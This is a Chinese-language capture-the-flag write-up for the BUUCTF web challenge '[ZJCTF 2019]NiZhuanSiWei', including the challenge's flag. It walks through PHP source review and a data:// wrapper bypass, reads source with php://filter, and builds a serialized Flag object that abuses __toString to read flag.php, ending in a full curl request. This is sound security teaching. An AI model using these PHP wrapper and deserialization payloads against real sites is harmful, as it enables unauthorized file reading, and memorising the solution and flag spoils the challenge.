---
title: "[ZJCTF 2019]NiZhuanSiWei"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-deserialization, file-inclusion, php-protocol, data-protocol]
vulnerability: PHP反序列化配合伪协议实现任意文件读取
solved: true
flag: "flag{6946f896-c579-45d5-8e0e-819e00df70c3}"
---

# [ZJCTF 2019]NiZhuanSiWei

## 题目概述
一道 PHP 代码审计题，涉及伪协议绕过、文件包含和反序列化漏洞的组合利用。

## 信息收集
访问页面直接显示源码：
```php
<?php
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit();
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
?>
```

代码注释提示 `useless.php`，用 `php://filter` 读取：
```php
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>
```

## 漏洞分析（漏洞类型、原理、判断过程）

### 漏洞1：data:// 伪协议绕过
`file_get_contents($text)` 需要返回 `"welcome to the zjctf"`，使用 `data://` 伪协议可直接写入数据：
```
data://text/plain,welcome to the zjctf
```

### 漏洞2：PHP反序列化 + __toString 触发
`Flag` 类有 `__toString()` 魔术方法，当对象被当作字符串输出时自动调用。代码中 `echo $password` 会触发此方法，读取 `$this->file` 指向的文件内容。

### 漏洞链
1. `data://` 协议绕过第一个检查
2. `include(useless.php)` 加载 Flag 类定义
3. `unserialize($password)` 反序列化恶意对象
4. `echo $password` 触发 `__toString()`，读取 flag.php

## 利用过程（Payload + Flag）

**步骤1**：绕过 text 检查
```
text=data://text/plain,welcome to the zjctf
```

**步骤2**：包含 useless.php 加载类定义
```
file=useless.php
```

**步骤3**：构造反序列化 payload
```php
<?php
class Flag {
    public $file;
}
$a = new Flag();
$a->file = "flag.php";
echo serialize($a);
// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

**完整请求**：
```bash
curl -s -G "http://target/" \
  --data-urlencode "text=data://text/plain,welcome to the zjctf" \
  --data-urlencode "file=useless.php" \
  --data-urlencode 'password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}'
```

**响应中获取 flag**：
```php
<?php
if(2===3){  
	return ("flag{6946f896-c579-45d5-8e0e-819e00df70c3}");
}
?>
```

## 复现步骤
1. 访问题目获取源码
2. 用 `php://filter` 读取 `useless.php` 获取 Flag 类定义
3. 构造序列化字符串，设置 `$file = "flag.php"`
4. 组合三个参数发送请求，在响应中获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 伪协议绕过 | `file_get_contents($text)` | `data://text/plain,welcome to the zjctf` | data:// 协议可直接返回数据 |
| 反序列化 | `unserialize($password)` | `O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}` | __toString 魔术方法触发条件 |
| 文件包含 | `include($file)` | `file=useless.php` | include 加载类定义 |

## 知识总结（解题技巧、同类题型套路）

1. **data:// 协议**：当需要 `file_get_contents()` 返回特定内容时，可用 `data://text/plain,内容` 直接注入数据
2. **php://filter**：读取 PHP 源码的标准姿势 `php://filter/read=convert.base64-encode/resource=xxx.php`
3. **反序列化利用链**：寻找 `__toString`、`__wakeup` 等魔术方法，结合 `echo`、`unserialize` 触发
4. **类定义加载**：反序列化前必须确保类已定义，通过 `include` 加载
